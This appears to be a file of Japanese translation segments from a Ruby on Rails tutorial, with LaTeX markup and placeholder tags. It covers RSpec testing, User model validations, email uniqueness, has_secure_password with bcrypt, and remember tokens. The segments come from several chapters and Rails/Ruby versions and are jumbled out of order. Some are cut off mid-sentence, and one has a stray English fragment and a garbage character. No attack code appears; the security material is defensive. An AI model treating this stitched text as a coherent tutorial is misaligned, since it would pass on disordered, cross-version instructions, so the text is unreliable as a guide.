# gem 'win32console', '1.3.2'<n>   # gem 'wdm', '0.1.0'
テストは最初は赤色 (失敗)、次に緑色 (成功) になるようにしてください
(\emph{ヒント}: 最初に、\kode{user_params}の許可リストに\kode{admin}を\emph{追加}する必要があります)。
現状の認証テストでは、ユーザーがサインインすると [Profile] や [Settings] などのリンクは表示されることをチェックしています。
その逆に、ユーザーがサインインしていないときはこれらのリンクが表示\emph{されない}ことを確認するテストも追加してください。
また、それぞれのフォームは\emph{完全に同じではない}ため、テストも更新の必要があります。フォームのわずかな違いを見つけ出し、テストの更新にそれを反映してください。
フレンドリーフォワーディングで、最初に与えられたURLにのみ確実に転送されていることを確認するテストを作成してください。
続けてサインインを行った後、転送先のURLはデフォルト (ユーザープロファイルページ) に戻る必要もありますので、これもテストで確認してください。
パーシャルを使用したnewユーザービュー。
フレンドリーフォワーディングの後、転送先がデフォルトページに変わることを確認するテスト。
  end
また、エラーメッセージに\kode{"Invalid"}という単語が含まれていることもテストします。
これらを合わせると、次のフォームの要素を探しだしてテストが行われます。
ここでのねらいは、ブラウザにこのbase64トークンを保存しておき、データベースにはトークンを暗号化したものを保存することです。
そして、cookiesからこのトークンを読みだして暗号化し、データベース上にある暗号化された記憶トークンと一致するものがあるかどうかを検索することにより、ユーザーを自動的にサインインさせることができます。
暗号化したトークンだけをデータベースに保存する理由は、万が一データベースが不正アクセスを受けるようなことがあっても、攻撃者が記憶トークンを使用してサインインできないようにするためです。
Active Recordでサポートされるコールバックの種類の詳細については、Rails Guidesの「\href{http://guides.rubyonrails.org/v3.1.23/active_record_validations_callbacks.html}{コールバックについて} (英語)」を参照してください。
\kode{SecureRandom.urlsafe_base64}は決して空欄には\emph{ならなくなった}ので、Userモデルのテストはパスするはずです。
データベース上の記憶トークンは暗号化されているので、cookiesから取り出した記憶トークンは、データベース上の記憶トークンを検索する前に暗号化する必要がある点に注意してください。
新しいリンクをレイアウトに追加するときに、Bootstrapの機能を使用してドロップダウンメニューを実現しましょう。詳細については「\href{http://twitter.github.com/bootstrap/components.html}{Bootstrapコンポーネント} (英語)」を参照してください。
さらに、Railsのために必要なRubyの知識は、通常のRubyを学ぶ過程とは\emph{異なります}。動的なWebアプリを作ることができればそれでよいというのであれば、まずRailsを学ぶようにし、Rubyについては当分の間、必要が生じた場合にのみ学習することをお勧めします。
そうではなく、真のRails\emph{エキスパート}になりたいのであれば、Rubyをさらに深いレベルまで理解する必要があります。本書は、そのための開発技術の基礎を築く助けになるでしょう。
あるヘルパーが特定のコントローラでのみ使用するものであれば、それに対応するヘルパーファイルに置く必要があります。たとえばStaticPagesコントローラ用ヘルパーは、通常\kode{app/helpers/static_pages_helper.rb}になります。
Homeページのタイトル確認用にテストを更新する。
ここで、単に既存のテストコードを修正するだけではなく、新しいテストコードを追加した理由について考えてみてください
ここで、Rubyの関数は \emph{暗黙の戻り値}を持つということに注意してください。これは、最後に評価された式の値が自動的に返されることを意味します。この場合、引数の\kode{string}が空かどうかに基づいた2つのメッセージ文字列のうちのいずれかが返されます。
Railsでは、このようなハッシュのハッシュ (または\emph{ネストされたハッシュ}) が大量に使われています。実際の使用例は\ref{sec:signup_failure}で説明します。
たとえば、\kode{:success}と\kode{:error}という 2つの状態を持つ \kode{flash} という名前のハッシュについて考えてみましょう。
=> {:success=>"It worked!", :error=>"It failed."}
結論としては、このデータモデルはメンテナンスの観点から見て悪夢です。ユーザー名を変更するたびに、\kode{users}テーブルのそのレコードだけでなく、\kode{followed_users}テーブルと\kode{followers}テーブルの両方について、\emph{そのユーザーを含むすべての行}を更新しなければならなくなります。
\kode{:data-turbolinks-track}というシンボルを作成しようとしますが、シンボルではハイフンを使用できないため、この記法は無効です。
この例ではRuby 1.9.3を前提としています。
{0}図4.3{/0}{1} StaticPagesコントローラの継承階層。{/1}
まとめると、{0}{1}第6章{/1}{/0}から{2}{1}第10章{/1}{/2}を通して、Railsのログインと認証システムをひととおり開発します。
この章は長いうえに、学ぶことがたくさんあります。特に、これまでデータモデリングをしたことがない人にとっては、もしかすると、これまでとは違った難しさを感じるかもしれません。
しかし、この章が終わるまでには、ユーザー情報の検証、保存、取得ができる極めて強力なシステムを作成します。
メールアドレスをユーザー名にしたことで、理屈の上では将来ユーザー同士で通信できるように拡張できる可能性が開かれます。
カラムをこのように名付けることによって、Active RecordでUserオブジェクトの属性を利用できるようになります。
それでは実際どのように動作するのか見てみましょう
上のコマンドはコントローラを作成しましたが、同様にモデルを作成するコマンドとして、\kode{generate model}があります。
      create    db/migrate/[timestamp]_create_users.rb
      invoke    rspec
      create      spec/models/user_spec.rb
(コントローラ名には複数形を使い、モデル名には単数形を用いるという慣習を頭に入れておいてください。コントローラはUsersでモデルはUserです)。
\kode{name:string}や\kode{email:string}オプションのパラメータを渡すことによって、データベースで使用したい2つの属性をRailsに伝えます。このときに、これらの属性の型情報も一緒に渡します (この場合は\kode{string})。
{0}図6.3{/0}{1}\href{http://sqlitebrowser.sourceforge.net/}{SQLite Database Browser}と作成した\kode{users}テーブル\href{http://railstutorial.org/images/figures/sqlite_database_browser-full.png}{(拡大)}{/1}
\emph{Railsチュートリアル}で使用されているものすべてを含め、ほとんどのマイグレーションが\emph{可逆}です。これは、\kode{db:rollback}というRakeタスクで変更を取り消せることを意味します。これを“マイグレーションの取り消し (migrate down)”と呼びます。
ただしその前に、完了させておかなければならない作業が2つあります。
モデル注釈
\kode{Gemfile}に\kode{annotate} gemを追加する。
(この注釈機能は本番アプリでは不要なので、\kode{annotate} gemは\kode{group :development}ブロックの中に書きます (\kode{group :test}に書いたときと同じ要領です))。
次に\kode{bundle install}を実行してインストールします。
これにより\kode{annotate}コマンドが使えるようになります。これを実行すると、モデルファイルにデータモデルを含んだコメントが追加されます。
Annotated (1): User
変更の結果をリスト\ref{code:annotated_user_model}に示します。
注釈が追加されたUserモデル。
# == Schema Information
# Table name: users
#  id         :integer         not null, primary key
#  name       :string(255)
#  email      :string(255)
#  created_at :datetime
#  updated_at :datetime
データモデルをモデルファイルの中にコメントとして残しておくと、モデルにどんな属性があるかを楽に思い出せます。なお簡潔さのため、本書で今後使用するコードにはこの注釈を付けません
(もし注釈を最新の状態に保ちたいのであれば、データモデルが変わるたびに\kode{annotate}を実行しなければならないことに注意してください)。
アクセス可能な属性
この行は、モデルのどの属性を\emph{アクセス可能}にするかをRailsに伝えます。たとえば、外部のユーザー (Webブラウザを使用してリクエストを送信するユーザーなど) が変更してもよい属性を指定します。
\kode{name}と\kode{email}属性をアクセス可能にする。
モデルにattr_accessibleを書かない場合は、デフォルトで「モデルの\emph{すべての}属性がアクセス可能」になります。
開発ログ (log/development.log) をtail -fしたまま上を実行していた場合、実行後に新しい行が何も表示されないことに気付いた方もいると思います。
これは、\kode{User.new}を実行しても単にRubyオブジェクトをメモリ上に作成するだけで、データベースにはアクセスしないためです。
このユーザーオブジェクトをデータベースに実際に保存するには、\kode{user}変数に対して\kode{save}メソッドを呼びます。
Active Recordによって多数のメソッドが提供されているので、本書では生のSQLを書く必要がありません。従って、本書ではこれ以降はSQLコマンドについての説明を省略します。
created_at: "2013-03-11 00:57:46", updated_at: "2013-03-11 00:57:46">
\kode{"2013-03-11 00:57:46"}というタイムスタンプが気になった方もいると思いますが、著者はこの箇所を真夜中過ぎに書いたわけではありません。実はこのタイムスタンプは\href{http://en.wikipedia.org/wiki/Coordinated_Universal_Time}{協定世界時 (UTC)} に合わせてあります。これは\href{http://en.wikipedia.org/wiki/Greenwich_Mean_Time}{グリニッジ標準時 (GMT)} と同様、標準時間として使用されます。
\kode{user.updated_at}の値に注目してください。
"2013-03-11 01:05:24", updated_at: "2013-03-11 01:05:24">
#<User id: 3, name: "Foo", email: "foo@bar.com", created_at: "2013-03-11
01:05:42", updated_at: "2013-03-11 01:05:42">
奇妙なことに、\kode{destroy}は\kode{create}と同じようにそのオブジェクト自身を返しますが、その返り値を使用しても、もう一度\kode{destroy}を呼ぶことはできません。
そして、おそらくさらに奇妙なことに、\kode{destroy}されたオブジェクトは以下のようにまだメモリ上に残っています。
オブジェクトが本当に削除されたかどうかをどのようにして知ればよいでしょうか。
このあたりで、Active Recordでユーザーオブジェクトを検索する方法を学んでみましょう。
\kode{find_by_email}は、\kode{users}テーブルの\kode{email}属性に基づいてActive Recordが自動的に生成するメソッドです
(ご想像どおり、Active Recordは\kode{find_by_name}というメソッドも自動的に生成します)。
Rails 4.0以降では、属性を検索する場合には上のメソッドに代えてより普遍性の高い\kode{find_by}メソッドを使用することが推奨されています。このメソッドでは属性をハッシュ形式で渡します。
created_at: "2013-03-11 00:57:46", updated_at: "2013-03-11 00:57:46">,
"2013-03-11 01:05:24", updated_at: "2013-03-11 01:05:24">]
=> "2013-03-11 00:57:46"
=> "2013-03-11 01:37:32"
さらに、メールアドレスをユーザーがログインするときの一意のユーザー名として使おうとしているので、メールアドレスがデータベース内で重複することのないようにする必要もあります。
Active Recordでは\emph{検証 (バリデーション: validation) }を使用してそのような制約を与えることができます。
\ref{sec:signup_failure}では、ユーザーが制約に違反したときに、検証機能によって自動的に表示される有用なエラーメッセージをお見せします。
サンプルアプリケーションの他の機能と同様、Userモデルへの検証の追加もテスト駆動開発 (TDD) で行います。
今回はUserモデルを作成したときに
実質的に空になっているデフォルトのUser spec。
上のコードでは\kode{pending}メソッドだけが置かれており、何か意味のあるコードでspecを埋めるように促しています。
このコードの効果は、空のテスト用データベースを用意してUserモデルのspecを実行することで確認できます。
Finished in 0.01999 seconds
1 example, 0 failures, 1 pending
Pending:
  User add some examples to (or delete)
  /Users/mhartl/rails_projects/sample_app/spec/models/user_spec.rb
  (Not Yet Implemented)
多くのシステムでは、pendingのspecはコマンドライン上で黄色で表示されます。黄色は、成功 (緑) と失敗 (赤) の中間を意味します。
環境を整えるためにテスト環境用データベースを作成するコマンドを実行するのはこれが初めてです。
マイグレーションの後でたまにRakeタスクが実行できなくなることがあり、多くの人がこれに戸惑います。
さらに、テストデータベースはたまに壊れることがあるので、その場合はリセットが必要です。
もしテストスイートが理由もなく壊れるようなことがあれば、\kode{rake test:prepare}を実行して、この問題が解決するか確認してみてください。
これはリスト\ref{code:user_spec}で使用されていました。
\kode{:name}と\kode{:email}属性のテスト。
これらのテストは、RSpecで使われる\emph{論理値の慣習}に依存しています。以下のコードは、
以下のRSpecのコードでテストできます。
このようなテストのおかげで、テスト駆動開発をベースに新しい属性やメソッドをUserモデルに追加することができます。さらに、すべての\kode{User}オブジェクトがこれらのメソッドに応答する必要があるという仕様もここで明らかになりました。
\kode{rake test:prepare}を実行してテスト環境用データベースを用意したので、テストはパスするはずです。
最初に\kode{name}属性の存在を確認するテストを行いましょう。
次に、その検証をコメントアウトし、失敗するテストを書き、そして検証のコメントアウトを解除することで、そのテストをパスさせられるかどうかを確認します。
この手続きは、このような単純なテストでは、大げさで気取ったものに感じられるかもしれません。しかし著者はこれまでに、実際には見当違いなことをテストしている「単純な」テストを山ほど見てきました。テスト駆動開発を慎重に進めることは、結局は「私たちが正しい事項をテストしている」という自信を得る為の\emph{唯一の}方法なのです。
(上で紹介したコメントアウトのテクニックは、コードはあってもテストがどこにもないような\href{http://en.wiktionary.org/wiki/quelle_horreur}{\emph{ひどい}}アプリケーションを急いで救出するときにも役に立ちます)。
selfを省略した結果をリスト\ref{code:validates_presence_of_name}に示します。
\kode{user.save}は\kode{false}を返しました。これは保存に失敗したことを意味します。
最後のコマンドは、\kode{valid?}メソッドで、オブジェクトがひとつ以上の検証に失敗したときに\kode{false}を返します。すべての検証がパスした場合は\kode{true}を返します。
失敗するテストを確認するために検証をコメントアウトする。
# validates :name, presence: true
これはリスト\ref{code:failing_validates_name_spec}で使用されていました。
\kode{name}属性の検証に対する、失敗するテスト。
1番目の新しいテスト例は、単なる健全性チェックです。これを使用して、まず\kode{@user}というsubjectが有効かどうかを確認します。
この場合、以下のメソッド呼び出しの結果をテストすることができます。
2番目のテストは、まずユーザーのnameに無効な値 (blank) を設定し、\kode{@user}オブジェクトの結果も無効になることをテストして確認します。
ユーザーのnameに無効な値 (blank) を設定するには\kode{before}ブロックを使います。次にユーザーオブジェクトの結果が無効であることを確認します。
この時点でテストが失敗することを確認してください。
4 examples, 1 failure
4 examples, 0 failures
もちろん、今度はメールアドレスの存在性も検証しましょう。
\kode{email}属性の存在性のテスト。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{name}属性と\kode{email}属性の存在性を検証する。
これですべてのテストにパスするはずです。これで、存在性の検証は完成しました。
\kode{name}属性の検証には、空文字でない、名前が51文字未満であるという最小限の制約しか与えていませんでした。\kode{email}属性の場合は、もっと厳重な要求を満たさなければなりません。
最初に、有効なメールアドレスと無効なメールアドレスのコレクションに対するテストを行いましょう。
=> ["user@foo.
COM A_US-ER@f.b.org frst.lst@foo.jp a+b@baz.cn]
ところで、この正規表現パターンはどうやって作ればよいのでしょうか。
大文字小文字を無視するオプション
ところで、公式標準によるとメールアドレスに完全に一致する正規表現は存在するのだそうです。しかし、苦労して導入するほどの甲斐はありません。
驚いたことに、公式標準によると\kode{"Michael Hartl"@example.com}のようなクォートとスペースを使用したメールアドレスも有効なのだそうです。
上の正規表現には少しだけ残念な点があります。\kode{foo@bar..com}のようなドットの連続を誤りとして検出できません。
{0}図6.4{/0}{1}素晴らしい正規表現エディタ\href{http://www.rubular.com/}{Rubular}。\href{http://railstutorial.org/images/figures/rubular-full.png}{(拡大)}{/1}
これでテストはすべてパスするはずです
(実際、この有効なメールアドレスのテストはこれまでいつもパスしてきました。正規表現のプログラミングは間違いが起こりやすいことで有名なので、ここで行なっている有効なメールアドレスのテストは、主として\kode{VALID_EMAIL_REGEX}に対する形式的な健全性チェックに過ぎません)。
残る制約は、メールアドレスが一意であることを強制するものだけとなりました。
今回もいつものようにテストを作成するところから始めます。
これはリスト\ref{code:validates_uniqueness_of_email_test}で使用されていました。
上のコードは、\kode{@user}と同じメールアドレスのユーザーを事前に作成する手法です。今回は、同じ属性のユーザーを作るために、\kode{@user.dup}を使っています。同じ属性のユーザーが保存された後では、元の\kode{@user}と同じメールアドレスが既にデータベース内に存在しているため、\kode{@user}は無効になります。
これはリスト\ref{code:validates_uniqueness_of_email}で使用されていました。
技術的には、メールアドレスのうちドメイン名部分だけが (本当は) 大文字小文字を区別しません。foo@bar.comは、本来はdFoo@bar.comとは別のアドレスです。
これはリスト\ref{code:validates_uniqueness_of_email_case_insensitive_test}で使用されていました。
大文字小文字を区別しない、重複するメールアドレスの拒否のテスト。
このテストは最初のメールアドレスの重複テストと同じことをしていますが、大文字に変換したメールアドレスを使っている点が異なります。
現在の一意性検証では大文字小文字を区別しているため、\kode{user_with_same_email.valid?}は\kode{true}になります。しかし、ここでは\kode{false}になる必要があります。
上のコードでは、単に\kode{true}を\kode{case_sensitive: false}で置き換えただけであることに注目してください。Railsはこの場合、\kode{:uniqueness}を\kode{true}と判断します。
この時点で、アプリケーションは重要な警告と共にメールアドレスの一意性を強制し、テストスイートもパスするはずです。
上で示した警告には、1つ小さな問題があります。
\kode{validates :uniqueness}を使用しても、一意性は保証されません。
いったい何が問題なのでしょうか。
以下のシナリオを見てください。
上のシナリオが信じがたいもののように思えるかもしれませんが、どうか信じてください。RailsのWebサイトでは、トラフィックが多いときにこのような問題が発生する可能性があるのです。
幸い、解決策の実装は簡単です。実は、この問題はデータベースレベルでも一意性を強制するだけで解決します。
具体的には、emailカラムにデータベースの\emph{インデックス}を作成し、そのインデックスが一意であることを要求します。
データモデルの変更が必要になったらその都度マイグレーションを行うのがRails流です。
残念なことに、メールアドレスの一意性を保証するためには、もう1つやらなければならないことがあります。それは、メールアドレスをデータベースに保存する前にすべての文字を小文字に変換することです。
その理由は、データベースのアダプタが常に大文字小文字を区別するインデックスを使っているとは限らないからです
著者のシステム上のSQLiteとHeroku上のPostgreSQLで直接実験してみたところ、この手順は実際に必要であることがわかりました。
これを行うには\href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{コールバック}}というテクニックを利用します。コールバックとは、Active Recordオブジェクトが持続している間のどこかの時点で、Active Recordオブジェクトに呼び出してもらうメソッドです (Rails APIの「\href{http://api.rubyonrails.org/v4.0.0/classes/ActiveRecord/Callbacks.html}{コールバックの登録ポイント} (英語)」を参照してください)。
selfを省略した結果をリスト\ref{code:email_downcase}に示します。
これで、先に述べたアリスのシナリオはうまくいくようになります。データベースは、最初のリクエストに基づいてユーザーのレコードを保存しますが、2度目の保存は一意性の制約に反するので拒否します
(Railsのログにエラーが出力されますが、害は生じません。
本の中で、与えられた言葉 (例えば、“foobar”) が出てくる箇所をすべて見つけるためには、ページを端から順にめくって最後まで探す必要があります。
この節では、ユーザーに最後の属性を追加します。セキュアパスワードは、サンプルアプリケーションでユーザーを認証するために使用します。
セキュアなパスワードの実装は、\kode{has_secure_password}というRailsのメソッドを呼び出すだけでほとんど終わってしまいます (このメソッドはRails 3.1から導入されました)。
このメソッド1つだけでセキュアなパスワードの実装がほとんど終わってしまうので、逆にこの機能を一から手作りするのは簡単ではありません。
(スクリーンキャストは、このような一からの手作り開発手順を解説するのに向いています。この課題を十分に理解したい方は「\href{http://railstutorial.org/screencasts}{Ruby on Rails Tutorial screencasts} (英語)」を参照してください)。
このとき、システム環境によっては以下の警告が出力されることがあります。
make: /usr/bin/gcc-4.2: No such file or directory
この問題を修正するには、\kode{clang}フラグを追加してRVMを再インストールします。
これはリスト\ref{code:respond_to_password_digest}で使用されていました。
Userオブジェクトに\kode{password_digest}カラムがあることを確認するテスト。
このテストがパスするには、最初に\kode{password_digest}カラム用の適切なマイグレーションを生成します。
上のコマンドの最初の引数はマイグレーション名、次の引数は作成する属性の名前と型です
これはリスト\ref{code:generate_user_model}で使用されていました。
マイグレーション名は自由に指定できますが、上のように末尾を\kode{_to_users}にしておくことをお勧めします。こうしておくと、\kode{users}テーブルにカラムを追加するマイグレーションがRailsによって自動的に作成されるからです。
上のコードでは、\kode{add_column}メソッドを使用して\kode{password_digest} カラムを\kode{users}テーブルに追加しています。
リスト\ref{code:respond_to_password_digest}のとき
パスワード確認の強制はコントローラの階層でも行うことができますが、モデルの中でActive Recordを使用して制限を与えるのが慣習になっています。
そのためには、\kode{password}属性と\kode{password_confirmation}属性をUserモデルに追加し、レコードをデータベースに保存する前に2つの属性が一致するように要求します。
これまでに使用した属性と異なり、パスワード関連の属性は「\emph{仮想}」にする点に注意してください。つまり、これらの属性は一時的にメモリ上に置き、データベースには保存されないようにします。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{password}属性と\kode{password_confirmation}属性をテストする。
上のコードでは、以下のように\kode{User.new}ハッシュの初期化に\kode{:password}と\kode{:password_confirmation}を追加していることに注目してください。
パスワードは空欄であってはならないので、パスワードの存在確認テストを別に追加します。
パスワードの不一致テストはこのすぐ後に追加するので、上のコードではパスワードとパスワードの確認を両方とも空欄にすることでパスワードの\emph{存在}確認テストを行なっています。
パスワードとパスワードの確認が一致するかどうかもテストする必要があります。
これはリスト\ref{code:password_tests}で使用されていました。
パスワードとパスワードの確認をテストする。
selfを省略した結果をリスト\ref{code:initial_passing_password_tests}に示します。
最初のパスワードテストをパスするようにする。
現在のパスワード関連テストがすべてパスするようになり、他の多くのテストにもパスするようになります。
テスト駆動開発用に\kode{has_secure_password}をコメントアウトする。
# has_secure_password
パスワード機構というパズルの最後のひとかけらは、ユーザーをメールアドレスとパスワードに基いて取得する手段です。
この作業は2つに分けるのが自然です。最初に、ユーザーをメールアドレスで検索します。次に、受け取ったパスワードでユーザーを認証します。
次の手順は、\kode{authenticate}メソッドを使用して、受け取ったパスワードがユーザーのパスワードと一致することを確認します。
受け取ったパスワードがユーザーのパスワードと一致するとユーザーが返され、一致しない場合は\kode{false}が返されます。
これまで同様、RSpecを使用して\kode{authenticate}メソッドへの要求内容を表現することができます。
ただし、このテストはこれまでよりも高度な内容になるため、いくつかに分割して説明します。RSpecが初めての方は、この節を繰り返し読んでみてください。
最初に、Userオブジェクトが\kode{authenticate}に応答することを要求します。
次に、パスワードが一致する場合と一致しない場合についてそれぞれ記述します。
let(:found_user) { User.find_by(email: @user.email) }
上のコードで、\kode{before}ブロックはユーザーをデータベースに事前に保存します。これにより、\kode{find_by}メソッドが動作するようになります。このメソッドを\kode{let}メソッドで以下のようにテストします。
これまでいくつかの演習で\kode{let}メソッドを使用してきましたが、今回のようにチュートリアルの本文で言及するのはこれが初めてです。
以下のコードに注目してください。
上のコードでは\kode{let}がもう一度使用されており、さらに\kode{specify}というメソッドも使用されています。
実は、このspecifyは\kode{it}と同義であり、\kode{it}を使用すると英語として不自然な場合にこれで代用することができます。
\texttt{let}メソッド
RSpecの\texttt{let}メソッドを使用すると、テスト内で簡単にローカル変数を作成することができます。
文法は一見奇妙ですが、動作は変数への割り当てと似ています。
\texttt{let}の引数はシンボルであり、さらにブロックを引数に取ります。そのブロックは、このシンボル名を持つローカル変数に値を返します。
\texttt{found_user}という変数が作成され、その値は\texttt{find_by}の返し値に等しくなります。
これにより、この変数はすべての\texttt{before}または\texttt{it}ブロックでテストの間利用できるようになります。
(\href{http://en.wikipedia.org/wiki/Memoization}{\emph{メモ化}}は技術用語であり、決して "memorize" の誤りでは\emph{ありません}) 。
この場合、\texttt{found_user}変数は\texttt{let}によってメモ化され、\texttt{find_by}メソッドが実際に呼び出されるのはUserモデルのspecが実際に実行されるときだけとなります。
最後に、セキュリティの常道として、パスワードの長さ検証をテストします。以下のコードでは、パスワードは6文字以上であることを要求します。
パスワードの長さと\kode{authenticate}メソッドをテストする。
しかし今では、Web開発者が認証システムというものを以前よりも深く理解するようになり、最新のRailsには認証システムも同梱されるようになりました。
ここまで実装を進めてきたので、あとほんの数行を追加してセキュアパスワードの実装を完了し、テストスイートを緑色 (成功) にしましょう。
(パスワードの存在検証と確認は\kode{has_secure_password}によって自動的に追加されます。)
この実装が唯一手間のかかる箇所ですが、最新のRailsでは\kode{has_secure_password}を使用するだけでこれらの機能をすべて自由に利用できます。
データベースに\kode{password_digest}カラムを置くという条件さえ守れば、上のメソッドをモデルに追加するだけで新規ユーザーの作成と認証をセキュアにすることができます。
(\kode{has_secure_password}の実装に興味のある方は、\href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{\texttt{secure_password.rb}のソースコード}を参照してみるとよいでしょう。このソースコードには十分な解説があり、しかも読みやすくできています。
そのコードに、以下の行があることに注目してください。
上のコードを実行するだけで、(\href{http://api.rubyonrails.org/v4.0.0/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}に記載されているように) \kode{password_confirmation}という属性が作成されます。
このコードには\kode{password_digest}属性の検証も含まれます。)
ここまで来たら、テストスイートがパスすることを確認しましょう。
この作業によって、これまでの節で行なってきた実装が動作することも実感できることでしょう。テストスイートがパスするだけでは味気ないので、実際に開発データベースにユーザーを登録することで喜びを感じていただければと思います。
created_at: "2013-03-11 20:45:19", updated_at: "2013-03-11 20:45:19",
password_digest: "$2a$10$kn4cQDJTzV76ZgDxOWk6Je9A0Ttn..."
{0}図6.6{/0}{1}SQLiteデータベース\kode{db/development.sqlite3}に登録されたユーザーの行。\href{http://railstutorial.org/images/figures/sqlite_user_row_with_password_4_0-full.png}{(拡大)}{/1}
=> "$2a$10$kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7.n..."
また、最初に無効なパスワード、次に有効なパスワードを与えることで\kode{authenticate}の動作を確認することもできます。
この章では、まったく最初からUserモデルを作成し、それに\kode{name}属性と\kode{email}属性を与え、さまざまなパスワード属性も与え、値を制限する多くの重要な検証も追加しました。
さらに、与えられたパスワードをセキュアに認証できるようにしました。
以前のバージョンのRailsであれば、このような実装を行うためのコードは現在の倍以上になっていたことでしょう。しかし今ではコンパクトな \kode{validates}メソッドと\kode{has_secure_password}メソッドのおかげで、ほんの数行のコードを書くだけで完全なUserモデルを作成できるようになりました。
次にmasterブランチにマージバックします。
このテストでは、\kode{reload}メソッドを使用してデータベースから値を再度読み込み、\kode{eq}メソッドを使用して同値であるかどうかをテストしてください。
selfを省略した結果をリスト\ref{code:downcase_bang}に示します。
Rails APIサイトの\kode{ActiveRecord::Base}の項を読み通し、どんなことができるかを把握してください。
Rails APIサイトで\kode{validates}メソッドを調べ、どんなことができるか、どんなオプションがあるかを調べてください。
\href{http://www.rubular.com/}{Rubular}で２〜３時間ほど遊んでみてください。
セキュアパスワードという手法では、各ユーザーにパスワードとパスワードの確認を入力させ、それを (そのままではなく) 暗号化したものをデータベースに保存します。
ユーザーの認証は、パスワードの送信、暗号化、データベース内の暗号化された値との比較という手順を踏みます。
ここで、生のパスワードではなく、暗号化されたパスワード同士を比較していることに注目してください。こうすることで、生のパスワードをデータベースに保存するという危険なことをしなくてもユーザーを認証できます。
ハッシュ関数には最新の\href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt}を使用し、パスワードを不可逆的に暗号化してパスワードハッシュを作成します。
次に、\kode{password}属性と\kode{password_confirmation}属性を追加し、パスワードが存在することを要求し、パスワードとパスワードの確認が一致することを要求し、さらに\kode{authenticate}メソッドを使用して、暗号化されたパスワードと\kode{password_digest}を比較してユーザーを認証するという多くの手順が必要です。
上の文字列は、パスワード (\kode{"foobar"}) を暗号化したものであり、ユーザーオブジェクトを初期化するのに使用されました。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
id=\texttt{1}のユーザーを表示するページ
id=\texttt{1}のユーザーを編集するページ
id=\texttt{1}のユーザーを更新するアクション
id=\texttt{1}のユーザーを削除するアクション
リスト\ref{code:hello_root_route}のとき
もちろん、.gitignoreなどを適切に利用すれば、そうした機密情報を適切に扱うことができます。しかしそのためにはそれなりの経験が必要であり、慣れた開発者でもときに扱いを間違えてしまうことがありえるのです。
ページの内容は図\ref{fig:hello_world_first_app}とまったく同じですが、今やそれがインターネット上の本番Webページとして堂々と公開されているのです。
  $ kill -15 12241
  $ pkill -15 -f spring
開発中に動作がおかしくなったりプロセスがフリーズしていると思えたら、すぐに\texttt{ps aux}で状態を確認し、\texttt{kill -15 <pid>}や\texttt{pkill -15 -f <プロセス名>}でクリーンアップしましょう。
これは、\kode{rails new}で生成されたコードはシングルクオーテーションを使っていますが、\href{https://github.com/kern/minitest-reporters}{minitestレポーターのドキュメント}ではダブルクオーテーションを使っていることが原因です。
\kode{new}フォームと\kode{edit}フォームをパーシャル化する
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
リスト{p0}で定義されている{2}authenticated?{/2}メソッド内の{2}remember_token{/2}の引数は、リスト\ref{code:user_model_remember}の{2}attr_accessor :remember_token{/2}で定義されているアクセサと同じではない点にご注意ください。引数は、メソッド内ローカルな変数になっていますが、
Bundlerでは本番環境用のgemはインストールしない設定にしておいたので (\ref{sec:sample_app_setup})、リスト\ref{code:unicorn_gemfile}は開発環境に影響はありません。しかし、Bundlerに\kode{Gemfile.lock}を更新してもらう必要があるので、いつものように次のコマンドを実行しておきます。
次の図\ref{fig:filled_in_form}に示すように、テキストフィールド (\kode{type="text"}と\kode{type="email"}) では内容をそのまま表示していますが、パスワードフィールド (\kode{type="password"}) ではセキュリティ上の目的のために文字が隠蔽されています (図\ref{fig:filled_in_form})。
これはリスト\ref{code:base_title_test}で使用されていました。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0.beta4/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
演習の解答
属性を更新するもうひとつの方法は、\kode{update_attributes}を使うものです
リスト\ref{code:email_format_validation_tests}と同様に、リスト\ref{code:email_format_validation_tests}でもエラーメッセージをカスタマイズして、どのメールアドレスで失敗したのかすぐに特定できるようにしておきます。 includes a custom error message to identify the exact address causing any failure.
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0.beta2/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
selfを省略した結果をリスト\ref{code:debugger}に示します。
(�図\ref{fig:signup_failure_3rd_edition}の下部に見えているのがRailsの\emph{web console}という機能です。これはrails consoleをブラウザ上で開けるようにし、デバッグをしやすくするための機能です。
リスト\ref{code:generating_pages}では、コントローラ名をキャメルケース (訳注: 単語の頭文字を大文字にしてつなぎ合わせた名前) で渡していることに注目してください。こうすると、StaticPagesコントローラ名を\href{https://en.wikipedia.org/wiki/Snake_case}{スネークケース} (訳注: 単語間にアンダースコアを加えて繋ぎ合わせた名前) にしたファイル \kode{static_pages_controller.rb} を自動的に生成します。
追伸: \kode{rails g}は \kode{rails generate}コマンドの短縮形であり、Railsでサポートされている多数の短縮形のひとつです (表\ref{table:shortcuts})。
とにかく\kode{about.html.erb}を正しいディレクトリに作成できたので、リスト\ref{code:custom_about_page}のとおりにコードを入力します。
\kode{log_out}メソッドをSessionsコントローラの\kode{destroy}アクションでも同様に使用します (リスト\ref{code:destroy_session})。
リスト{p0}のアプリケーションコードでは、{2}logged_in?{/2}がtrueの場合に限って{2}log_out{/2}を呼び出すように変更しました。
これはリスト\ref{code:password_reset_integration_test}で使用されていました。
これはリスト\ref{code:branch_raise}で使用されていました。
これはリスト\ref{code:rails_routes_root_route}で使用されていました。
上の最後の手順が、ユーザーログインのときの手順と似ていることにご注目ください。ユーザーログインでは、メールアドレスをキーにしてユーザーを取り出し、送信されたパスワードがパスワードダイジェストと一致することを (\kode{authenticate}メソッドで) 確認します (リスト\ref{code:log_in_success})。
これはリスト\ref{code:authenticated_p}で使用されていました。
これはリスト\ref{code:log_in_success}で使用されていました。
このコードはリスト\ref{code:title_tests}で使用されていました。もうひとつ、
 * This is a manifest file that'll automatically include all the stylesheets
 * available in this directory and any sub-directories.
 * application-wide styles to this file and they'll appear at the top of the
